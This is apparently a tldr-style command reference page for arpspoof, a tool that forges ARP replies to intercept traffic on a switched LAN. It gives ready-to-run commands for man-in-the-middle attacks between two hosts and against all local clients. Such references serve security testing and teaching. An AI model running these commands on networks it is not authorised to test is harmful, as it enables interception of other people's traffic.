# arpspoof

> Intercept packets on a switched LAN.
> Redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an effective way of sniffing traffic on a switch.
> Kernel IP forwarding must be turned on ahead of time.
> For more information: <https://linux.die.net/man/8/arpspoof>

- Make a simple man-in-the-middle attack between two local hosts (run both at the same time, via `screen` or multiple terminal sessions):

`sudo arpspoof -i {{eth0}} -t {{192.168.0.1}} {{192.168.0.2}}`
`sudo arpspoof -i {{eth0}} -t {{192.168.0.2}} {{192.168.0.1}}`

- Make a simple man-in-the-middle attack for all local clients:

`sudo arpspoof -i {{eth0}} {{192.168.0.1}}`
